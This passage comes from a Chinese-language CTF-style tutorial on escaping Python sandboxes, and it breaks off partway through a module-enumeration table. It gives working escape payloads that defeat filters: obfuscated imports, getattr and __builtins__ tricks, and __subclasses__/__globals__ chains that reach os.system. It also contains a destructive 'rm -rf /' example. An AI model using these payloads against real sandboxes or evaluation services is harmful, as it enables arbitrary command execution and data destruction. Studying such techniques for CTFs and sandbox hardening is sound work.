的内建函数中，有一些函数可以帮助我们实现任意命令执行：\n1 2 3 4 5 6 7 8 os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() 可直接执行命令的模块有\n1 2 3 4 5 os pty subprocess plarform commands 有些时候，比如CTF，我们并不需要去执行命令，而是去读取目录下的flag文件即可，也就是说需要文件读取的模块来执行，常用的文件读取模块：\n1 2 3 4 file open codecs fileinput 不过其中file只在python2中执行\n常见的Python沙箱逃逸方法\r我们上面提到，在沙箱中，我们往往无法直接利用上面的危险函数和模块，因此我们就需要导入相关模块并使用上述的函数实现命令执行。\n于是，Python沙箱逃逸的重点就落在了如何绕过防御措施来导入我们需要的模块并使用上述函数。\n1.覆盖或替换函数/模块\rPython允许覆盖内置函数（如__import__、open、eval 等）或模块（如 os、sys）。 示例：\n1 2 3 python # 覆盖 __import__ 函数以绕过限制 __import__ = lambda x: os.system(\u0026#34;rm -rf /\u0026#34;) # 恶意操作 2.绕过导入限制\r过滤库\rPython导入库的形式很灵活，比如：\n1 2 3 4 5 过滤了import os import os import os import os ... 如果多个空格也过滤了，Python 能够 import 的可不止 import，还有 __import__：__import__('os')，__import__被干了还有 importlib：importlib.import_module('os').system('ls')\n如果过滤了模块名，我们也可以使用路径引入的方式来导入模块：\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; import sys \u0026gt;\u0026gt;\u0026gt; sys.modules[\u0026#39;os\u0026#39;]=\u0026#39;/usr/lib/python2.7/os.py\u0026#39; \u0026gt;\u0026gt;\u0026gt; import os \u0026gt;\u0026gt;\u0026gt; 如果 import 也被过滤，我们同样可以使用路径引入的方式来导入模块\n1 2 3 4 plaintext execfile(\u0026#39;/usr/lib/python2.7/os.py\u0026#39;) system(\u0026#39;ls\u0026#39;) // 只能在Python2中使用execfile 或是\n1 2 3 4 python with open(\u0026#39;/usr/lib/python3.6/os.py\u0026#39;,\u0026#39;r\u0026#39;) as f: exec(f.read()) system(\u0026#39;ls\u0026#39;) 这种方式 Python2 和 Python3 都可以使用，但是使用这种方式都需要已知库的路径，在大多数的环境下，库都是默认路径。\n字符串处理绕过过滤\r代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os：\n1 __import__(\u0026#39;so\u0026#39;[::-1]).system(\u0026#39;ls\u0026#39;) 1 2 3 b = \u0026#39;o\u0026#39; a = \u0026#39;s\u0026#39; __import__(a+b).system(\u0026#39;ls\u0026#39;) 还可以利用 eval 或者 exec：\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; eval(\u0026#39;)\u0026#34;imaohw\u0026#34;(metsys.)\u0026#34;so\u0026#34;(__tropmi__\u0026#39;[::-1]) macr0phag3 0 \u0026gt;\u0026gt;\u0026gt; exec(\u0026#39;)\u0026#34;imaohw\u0026#34;(metsys.so ;so tropmi\u0026#39;[::-1]) macr0phag3 顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了\n过滤system\r我们可以发现，如果使用 os 模块来进行攻击，都会使用到 system 函数，如果过滤了 system 函数，是否我们就无能为力了？实则不然， os 中能执行命令的函数有很多：\n1 2 3 4 5 6 print(os.system(\u0026#39;whoami\u0026#39;)) print(os.popen(\u0026#39;whoami\u0026#39;).read()) print(os.popen2(\u0026#39;whoami\u0026#39;).read()) # 2.x print(os.popen3(\u0026#39;whoami\u0026#39;).read()) # 2.x print(os.popen4(\u0026#39;whoami\u0026#39;).read()) # 2.x ... 对于过滤函数的问题，我们可以通过 getattr 拿到对象的方法、属性：\n1 2 import os getattr(os, \u0026#39;metsys\u0026#39;[::-1])(\u0026#39;whoami\u0026#39;) 不让出现 import也没事：\n1 2 3 \u0026gt;\u0026gt;\u0026gt; getattr(getattr(__builtins__, \u0026#39;__tropmi__\u0026#39;[::-1])(\u0026#39;so\u0026#39;[::-1]), \u0026#39;metsys\u0026#39;[::-1])(\u0026#39;whoami\u0026#39;) macr0phag3 0 这个方法同样可以用于逃逸过滤 import 的沙箱。与 getattr 相似的还有 __getattr__、__getattribute__，它们自己的区别就是 getattr 相当于 class.attr，都是获取类属性/方法的一种方式，在获取的时候会触发__getattribute__，如果__getattribute__找不到，则触发__getattr__，还找不到则报错。\nbuiltins、builtin与builtins\r先说一下，builtin、builtins，__builtin__与__builtins__的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。\n在 2.x 版本中，内建模块被命名为__builtin__，到了 3.x 就成了 builtins。它们都需要 import 才能查看,__builtins__两者都有，实际上是__builtin__和builtins 的引用。它不需要导入\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; \u0026#39;__import__\u0026#39; in dir(__builtins__) True \u0026gt;\u0026gt;\u0026gt; __builtins__.__dict__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;) macr0phag3 0 \u0026gt;\u0026gt;\u0026gt; \u0026#39;eval\u0026#39; in dir(__builtins__) True \u0026gt;\u0026gt;\u0026gt; \u0026#39;execfile\u0026#39; in dir(__builtins__) True 我们看到里面有很多我们可以利用的危险函数\n通过继承关系绕逃逸\rPython 中新式类都有个属性，叫__mro__，是个元组，记录了继承关系：\n1 2 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__ (\u0026lt;class \u0026#39;str\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;) 类的实例在获取 class 属性时会指向该实例对应的类。可以看到，’’属于 str类，它继承了 object 类，这个类是所有类的超类。具有相同功能的还有__base__和__bases__。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; class test: ... pass ... \u0026gt;\u0026gt;\u0026gt; test.__bases__ \u0026gt;\u0026gt;\u0026gt; class test(object): ... pass ... \u0026gt;\u0026gt;\u0026gt; test.__bases__ (\u0026lt;type \u0026#39;object\u0026#39;\u0026gt;,) 那么知道这个有什么用呢？\n由于没法直接引入 os，那么假如有个库叫oos，在oos中引入了os，那么我们就可以通过__globals__拿到 os（__globals__是函数所在的全局命名空间中所定义的全局变量）。例如，site 这个库就有 os：\n1 2 3 \u0026gt;\u0026gt;\u0026gt; import site \u0026gt;\u0026gt;\u0026gt; site.os \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py\u0026#39;\u0026gt; 也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 import site。可以利用 reload，变相加载 os：\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; import site \u0026gt;\u0026gt;\u0026gt; os Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; NameError: name \u0026#39;os\u0026#39; is not defined \u0026gt;\u0026gt;\u0026gt; os = reload(site.os) \u0026gt;\u0026gt;\u0026gt; os.system(\u0026#39;whoami\u0026#39;) macr0phag3 0 还有，既然所有的类都继承的object，那么我们先用__subclasses__看看它的子类，以 2.x 为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 python 2\u0026gt;\u0026gt;\u0026gt; for i in enumerate(\u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()): print i ... (0, \u0026lt;type \u0026#39;type\u0026#39;\u0026gt;) (1, \u0026lt;type \u0026#39;weakref\u0026#39;\u0026gt;) (2, \u0026lt;type \u0026#39;weakcallableproxy\u0026#39;\u0026gt;) (3, \u0026lt;type \u0026#39;weakproxy\u0026#39;\u0026gt;) (4, \u0026lt;type \u0026#39;int\u0026#39;\u0026gt;) (5, \u0026lt;type \u0026#39;basestring\u0026#39;\u0026gt;) (6, \u0026lt;type \u0026#39;bytearray\u0026#39;\u0026gt;) (7, \u0026lt;type \u0026#39;list\u0026#39;\u0026gt;) (8, \u0026lt;type \u0026#39;NoneType\u0026#39;\u0026gt;) (9, \u0026lt;type \u0026#39;NotImplementedType\u0026#39;\u0026gt;) (10, \u0026lt;type \u0026#39;traceback\u0026#39;\u0026gt;) (11, \u0026lt;type \u0026#39;super\u0026#39;\u0026gt;) (12, \u0026lt;type \u0026#39;xrange\u0026#39;\u0026gt;) (13, \u0026lt;type \u0026#39;dict\u0026#39;\u0026gt;) (14, \u0026lt;type \u0026#39;set\u0026#39;\u0026gt;) (15, \u0026lt;type \u0026#39;slice\u0026#39;\u0026gt;) (16, \u0026lt;type \u0026#39;staticmethod\u0026#39;\u0026gt;) (17, \u0026lt;type \u0026#39;complex\u0026#39;\u0026gt;) (18, \u0026lt;type \u0026#39;float\u0026#39;\u0026gt;) (19, \u0026lt;type \u0026#39;buffer\u0026#39;\u0026gt;) (20, \u0026lt;type \u0026#39;long\u0026#39;\u0026gt;) (21, \u0026lt;type \u0026#39;frozenset\u0026#39;\u0026gt;) (22, \u0026lt;type \u0026#39;property\u0026#39;\u0026gt;) (23, \u0026lt;type \u0026#39;memoryview\u0026#39;\u0026gt;) (24, \u0026lt;type \u0026#39;tuple\u0026#39;\u0026gt;) (25, \u0026lt;type \u0026#39;enumerate\u0026#39;\u0026gt;) (26, \u0026lt;type \u0026#39;reversed\u0026#39;\u0026gt;) (27, \u0026lt;type \u0026#39;code\u0026#39;\u0026gt;) (28, \u0026lt;type \u0026#39;frame\u0026#39;\u0026gt;) (29, \u0026lt;type \u0026#39;builtin_function_or_method\u0026#39;\u0026gt;) (30, \u0026lt;type \u0026#39;instancemethod\u0026#39;\u0026gt;) (31, \u0026lt;type \u0026#39;function\u0026#39;\u0026gt;) (32, \u0026lt;type \u0026#39;classobj\u0026#39;\u0026gt;) (33, \u0026lt;type \u0026#39;dictproxy\u0026#39;\u0026gt;) (34, \u0026lt;type \u0026#39;generator\u0026#39;\u0026gt;) (35, \u0026lt;type \u0026#39;getset_descriptor\u0026#39;\u0026gt;) (36, \u0026lt;type \u0026#39;wrapper_descriptor\u0026#39;\u0026gt;) (37, \u0026lt;type \u0026#39;instance\u0026#39;\u0026gt;) (38, \u0026lt;type \u0026#39;ellipsis\u0026#39;\u0026gt;) (39, \u0026lt;type \u0026#39;member_descriptor\u0026#39;\u0026gt;) (40, \u0026lt;type \u0026#39;file\u0026#39;\u0026gt;) (41, \u0026lt;type \u0026#39;PyCapsule\u0026#39;\u0026gt;) (42, \u0026lt;type \u0026#39;cell\u0026#39;\u0026gt;) (43, \u0026lt;type \u0026#39;callable-iterator\u0026#39;\u0026gt;) (44, \u0026lt;type \u0026#39;iterator\u0026#39;\u0026gt;) (45, \u0026lt;type \u0026#39;sys.long_info\u0026#39;\u0026gt;) (46, \u0026lt;type \u0026#39;sys.float_info\u0026#39;\u0026gt;) (47, \u0026lt;type \u0026#39;EncodingMap\u0026#39;\u0026gt;) (48, \u0026lt;type \u0026#39;fieldnameiterator\u0026#39;\u0026gt;) (49, \u0026lt;type \u0026#39;formatteriterator\u0026#39;\u0026gt;) (50, \u0026lt;type \u0026#39;sys.version_info\u0026#39;\u0026gt;) (51, \u0026lt;type \u0026#39;sys.flags\u0026#39;\u0026gt;) (52, \u0026lt;type \u0026#39;exceptions.BaseException\u0026#39;\u0026gt;) (53, \u0026lt;type \u0026#39;module\u0026#39;\u0026gt;) (54, \u0026lt;type \u0026#39;imp.NullImporter\u0026#39;\u0026gt;) (55, \u0026lt;type \u0026#39;zipimport.zipimporter\u0026#39;\u0026gt;) (56, \u0026lt;type \u0026#39;posix.stat_result\u0026#39;\u0026gt;) (57, \u0026lt;type \u0026#39;posix.statvfs_result\u0026#39;\u0026gt;) (58, \u0026lt;class \u0026#39;warnings.WarningMessage\u0026#39;\u0026gt;) (59, \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;) (60, \u0026lt;class \u0026#39;_weakrefset._IterationGuard\u0026#39;\u0026gt;) (61, \u0026lt;class \u0026#39;_weakrefset.WeakSet\u0026#39;\u0026gt;) (62, \u0026lt;class \u0026#39;_abcoll.Hashable\u0026#39;\u0026gt;) (63, \u0026lt;type \u0026#39;classmethod\u0026#39;\u0026gt;) (64, \u0026lt;class \u0026#39;_abcoll.Iterable\u0026#39;\u0026gt;) (65, \u0026lt;class \u0026#39;_abcoll.Sized\u0026#39;\u0026gt;) (66, \u0026lt;class \u0026#39;_abcoll.Container\u0026#39;\u0026gt;) (67, \u0026lt;class \u0026#39;_abcoll.Callable\u0026#39;\u0026gt;) (68, \u0026lt;type \u0026#39;dict_keys\u0026#39;\u0026gt;) (69, \u0026lt;type \u0026#39;dict_items\u0026#39;\u0026gt;) (70, \u0026lt;type \u0026#39;dict_values\u0026#39;\u0026gt;) (71, \u0026lt;class \u0026#39;site._Printer\u0026#39;\u0026gt;) (72, \u0026lt;class \u0026#39;site._Helper\u0026#39;\u0026gt;) (73, \u0026lt;type \u0026#39;_sre.SRE_Pattern\u0026#39;\u0026gt;) (74, \u0026lt;type \u0026#39;_sre.SRE_Match\u0026#39;\u0026gt;) (75, \u0026lt;type \u0026#39;_sre.SRE_Scanner\u0026#39;\u0026gt;) (76, \u0026lt;class \u0026#39;site.Quitter\u0026#39;\u0026gt;) (77, \u0026lt;class \u0026#39;codecs.IncrementalEncoder\u0026#39;\u0026gt;) (78, \u0026lt;class \u0026#39;codecs.IncrementalDecoder\u0026#39;\u0026gt;) 可以看到，site 就在里面，以 2.x 的 site._Printer 为例：\n1 2 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[\u0026#39;os\u0026#39;] \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc\u0026#39;\u0026gt; os 又回来了。并且 site 中还有 builtins。\n这个方法不仅限于 A-\u0026gt;os，还阔以是 A-\u0026gt;B-\u0026gt;os，比如 2.x 中的 warnings：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; import warnings \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.os Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; AttributeError: \u0026#39;module\u0026#39; object has no attribute \u0026#39;os\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.linecache \u0026lt;module \u0026#39;linecache\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc\u0026#39;\u0026gt; \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; warnings.linecache.os \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc\u0026#39;\u0026gt; 在继承链中就可以这样：\n1 2 3 \u0026gt;\u0026gt;\u0026gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;os\u0026#39;].system(\u0026#39;whoami\u0026#39;) macr0phag3 0 顺便说一下，warnings这个库中有个函数：warnings.catch_warnings，它有个_module属性：\n1 2 3 4 def __init__(self, record=False, module=None): ... self._module = sys.modules[\u0026#39;warnings\u0026#39;] if module is None else module ... 所以通过_module也可以构造 payload：\n1 2 3 \u0026gt;\u0026gt;\u0026gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == \u0026#39;catch_warnings\u0026#39;][0]()._module.linecache.os.system(\u0026#39;whoami\u0026#39;) macr0phag3 0 3.x 中的warnings虽然没有 linecache，也有__builtins__。\n同样，py3.x 中有\u0026lt;class 'os._wrap_close'\u0026gt;，利用方式可以为：\n1 2 3 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) macr0phag3 0 顺便提一下，object 本来就是可以使用的，如果没过滤这个变量的话，payload 可以简化为：\n1 2 3 4 5 6 7 8 9 object.__subclasses__()[117].__init__.__globals__[\u0026#39;system\u0026#39;](\u0026#39;whoami\u0026#39;) 还有一种是利用builtin_function_or_method 的 __call__： \u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, \u0026#39;1+1\u0026#39;) 或者简单一点： [].__getattribute__(\u0026#39;append\u0026#39;).__class__.__call__(eval, \u0026#39;1+1\u0026#39;) 还可以这样利用：\n1 2 3 4 5 6 class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, \u0026#39;1+1\u0026#39;)) # 如果是 3.x 的话可以简写为： # super().keys.__class__.__call__(eval, \u0026#39;1+1\u0026#39;)) test() 上面的这些利用方式总结起来就是通过__class__、__mro__、__subclasses__、__bases__等等属性/方法去获取 object，再根据__globals__找引入的__builtins__或者 eval 等等能够直接被利用的库，或者找到builtin_function_or_method类/类型__call__后直接运行 eval 。\n3.遍历获取逃逸方法\rPython 3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 python # coding=utf-8 find_modules = {\u0026#39;asyncio\u0026#39;: [\u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;collections\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;concurrent\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ctypes\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;curses\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;dbm\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;distutils\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;email\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;encodings\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;ensurepip\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;html\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;http\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;idlelib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;importlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__import__\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;json\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;lib2to3\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;logging\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;msilib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;multiprocessing\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pydoc_data\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sqlite3\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;test\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;tkinter\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;turtledemo\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;unittest\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;urllib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;venv\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;wsgiref\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;xml\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;xmlrpc\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;__future__\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;__phello__.foo\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_bootlocale\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_collections_abc\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_compat_pickle\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_compression\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_dummy_thread\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_markupbase\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_osx_support\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_pydecimal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_pyio\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;_sitebuiltins\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;_strptime\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_threading_local\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;_weakrefset\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;abc\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;aifc\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;antigravity\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;argparse\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ast\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;asynchat\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;asyncore\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;base64\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;bdb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;binhex\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;bisect\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;bz2\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;cProfile\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;calendar\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;cgi\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;cgitb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;chunk\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;cmd\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;code\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;codecs\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;codeop\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;colorsys\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;compileall\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;configparser\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;contextlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;copy\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;copyreg\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;crypt\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;csv\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;datetime\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;decimal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;difflib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;dis\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;doctest\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;dummy_threading\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;enum\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;filecmp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fileinput\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fnmatch\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;formatter\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;fractions\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;ftplib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;functools\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;genericpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;getopt\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;getpass\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;gettext\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;glob\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;gzip\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;hashlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;heapq\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;hmac\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;imaplib\u0026#39;: [\u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;imghdr\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;imp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;inspect\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;io\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;ipaddress\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;keyword\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;linecache\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;locale\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;lzma\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;macpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;macurl2path\u0026#39;: 